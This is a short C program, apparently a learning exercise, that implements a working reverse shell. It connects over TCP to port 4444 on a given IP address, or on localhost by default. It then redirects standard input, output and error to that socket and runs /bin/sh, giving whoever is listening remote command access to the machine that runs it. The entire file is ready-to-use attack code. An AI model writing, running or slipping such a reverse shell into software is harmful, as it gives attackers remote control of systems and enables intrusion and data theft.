#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#define PORT 4444

int main(int argc, char* argv[]) {

    int socketfd;
    socketfd = socket(AF_INET, SOCK_STREAM, 0);

    if(socketfd == -1){
        printf("Count not create client socket");
    }
    // struct for the socket address
    struct sockaddr_in server_address;
    // set server address family to IPv4
    server_address.sin_family = AF_INET;

    //specify the port - htons is a utility making sure it is in correct network bite order
    server_address.sin_port = htons(PORT);

    if(argc < 2){
        printf("No IP address declared, defaulting to localhost.\n");
        // shortcut for local IP addr
        server_address.sin_addr.s_addr=htonl(INADDR_LOOPBACK);
    } else {
        printf("Attempting to connect to %s\n", argv[1]);
        server_address.sin_addr.s_addr = inet_addr(argv[1]);
    }
    // 2. initiate the connection
    int connection = connect(socketfd, (struct sockaddr *)&server_address, sizeof(server_address));

    // error handling
    if(connection == -1){
        printf("There is an issue with the connection.\n");
        // early return
        return 0;
    }

    dup2(socketfd, 0);
    dup2(socketfd, 1);
    dup2(socketfd, 2);

    char *const shell_argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", shell_argv, NULL);
    return 0;
}